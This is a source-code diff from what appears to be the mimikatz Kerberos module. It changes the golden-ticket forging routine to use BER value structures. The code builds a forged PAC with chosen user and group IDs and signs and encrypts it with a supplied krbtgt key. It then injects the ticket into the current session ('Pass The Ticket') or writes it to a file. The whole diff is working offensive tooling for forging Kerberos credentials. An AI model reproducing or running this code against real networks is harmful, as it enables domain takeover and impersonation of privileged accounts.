@@ -412,13 +412,13 @@ GROUP_MEMBERSHIP defaultGroups[] = {{513, DEFAULT_GROUP_ATTRIBUTES}, {512, DEFAU
 NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 {
 	BYTE key[AES_256_KEY_LENGTH] = {0};
-	DWORD i, j, nbGroups, nbSids = 0, id = 500, keyType, rodc = 0,/*keyLen,*/ App_KrbCredSize;
+	DWORD i, j, nbGroups, nbSids = 0, id = 500, keyType, rodc = 0;
 	PCWCHAR szUser, szDomain, szService = NULL, szTarget = NULL, szSid, szKey = NULL, szId, szGroups, szSids, szRodc, szLifetime, base, filename;
 	PWCHAR baseSid, tmpSid, baseDot, netbiosDomain;
 	PISID pSid, pSidTmp;
 	PGROUP_MEMBERSHIP dynGroups = NULL, groups;
 	PKERB_SID_AND_ATTRIBUTES sids = NULL;
-	PDIRTY_ASN1_SEQUENCE_EASY App_KrbCred;
+	PBERVAL BerApp_KrbCred;
 	KUHL_M_KERBEROS_LIFETIME_DATA lifeTimeData;
 	BOOL isPtt = kull_m_string_args_byName(argc, argv, L"ptt", NULL, NULL);
 	NTSTATUS status;
@@ -574,21 +574,20 @@ NTSTATUS kuhl_m_kerberos_golden(int argc, wchar_t * argv[])
 
 										kprintf(L"-> Ticket : %s\n\n", isPtt ? L"** Pass The Ticket **" : filename);
 
-										if(App_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, netbiosDomain, szService, szTarget, &lifeTimeData, pSid, key, pCSystem->KeySize, keyType, id, groups, nbGroups, sids, nbSids, rodc))
+										if(BerApp_KrbCred = kuhl_m_kerberos_golden_data(szUser, szDomain, netbiosDomain, szService, szTarget, &lifeTimeData, pSid, key, pCSystem->KeySize, keyType, id, groups, nbGroups, sids, nbSids, rodc))
 										{
-											App_KrbCredSize = kull_m_asn1_getSize(App_KrbCred);
 											if(isPtt)
 											{
-												if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(App_KrbCred, App_KrbCredSize)))
+												if(NT_SUCCESS(kuhl_m_kerberos_ptt_data(BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len)))
 													kprintf(L"\nGolden ticket for '%s @ %s' successfully submitted for current session\n", szUser, szDomain);
 											}
-											else if(kull_m_file_writeData(filename, App_KrbCred, App_KrbCredSize))
+											else if(kull_m_file_writeData(filename, BerApp_KrbCred->bv_val, BerApp_KrbCred->bv_len))
 												kprintf(L"\nFinal Ticket Saved to file !\n");
 											else PRINT_ERROR_AUTO(L"\nkull_m_file_writeData");
 
-											LocalFree(App_KrbCred);
+											ber_bvfree(BerApp_KrbCred);
 										}
-										else PRINT_ERROR(L"KrbCred error\n");
+										else PRINT_ERROR(L"BerApp_KrbCred error\n");
 									}
 									else PRINT_ERROR(L"Krbtgt key size length must be %u (%u bytes) for %s\n", pCSystem->KeySize * 2, pCSystem->KeySize, kuhl_m_kerberos_ticket_etype(keyType));
 								}
@@ -654,14 +653,15 @@ NTSTATUS kuhl_m_kerberos_encrypt(ULONG eType, ULONG keyUsage, LPCVOID key, DWORD
 	return status;
 }
 
-PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR LogonDomainName, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, DWORD rodc)
+PBERVAL kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR domainname, LPCWSTR LogonDomainName, LPCWSTR servicename, LPCWSTR targetname, PKUHL_M_KERBEROS_LIFETIME_DATA lifetime, PISID sid, LPCBYTE key, DWORD keySize, DWORD keyType, DWORD userid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, DWORD rodc)
 {
 	NTSTATUS status;
-	PDIRTY_ASN1_SEQUENCE_EASY App_EncTicketPart, App_KrbCred = NULL;
 	KIWI_KERBEROS_TICKET ticket = {0};
 	KERB_VALIDATION_INFO validationInfo = {0};
 	PPACTYPE pacType; DWORD pacTypeSize;
 	DWORD SignatureType;
+
+	PBERVAL BerApp_EncTicketPart, BerApp_KrbCred = NULL;
 
 	if(ticket.ClientName = (PKERB_EXTERNAL_NAME) LocalAlloc(LPTR, sizeof(KERB_EXTERNAL_NAME) /* 1 UNICODE into */))
 	{
@@ -736,18 +736,18 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 		if(NT_SUCCESS(status))
 		{
 			kprintf(L" * PAC signed\n");
-			if(App_EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(&ticket, pacType, pacTypeSize))
+			if(BerApp_EncTicketPart = kuhl_m_kerberos_ticket_createAppEncTicketPart(&ticket, pacType, pacTypeSize))
 			{
 				kprintf(L" * EncTicketPart generated\n");
-				status = kuhl_m_kerberos_encrypt(keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keySize, App_EncTicketPart, kull_m_asn1_getSize(App_EncTicketPart), (LPVOID *) &ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);	
+				status = kuhl_m_kerberos_encrypt(keyType, KRB_KEY_USAGE_AS_REP_TGS_REP, key, keySize, BerApp_EncTicketPart->bv_val, BerApp_EncTicketPart->bv_len, (LPVOID *) &ticket.Ticket.Value, &ticket.Ticket.Length, TRUE);	
 				if(NT_SUCCESS(status))
 				{
 					kprintf(L" * EncTicketPart encrypted\n");
-					if(App_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(&ticket, FALSE))
+					if(BerApp_KrbCred = kuhl_m_kerberos_ticket_createAppKrbCred(&ticket, FALSE))
 						kprintf(L" * KrbCred generated\n");
 				}
 				else PRINT_ERROR(L"kuhl_m_kerberos_encrypt %08x\n", status);
-				LocalFree(App_EncTicketPart);
+				ber_bvfree(BerApp_EncTicketPart);
 			}
 		}
 		LocalFree(pacType);
@@ -762,7 +762,7 @@ PDIRTY_ASN1_SEQUENCE_EASY kuhl_m_kerberos_golden_data(LPCWSTR username, LPCWSTR 
 	if(ticket.ServiceName)
 		LocalFree(ticket.ServiceName);
 
-	return App_KrbCred;
+	return BerApp_KrbCred;
 }
 
 NTSTATUS kuhl_m_kerberos_hash_data(LONG keyType, PCUNICODE_STRING pString, PCUNICODE_STRING pSalt, DWORD count)
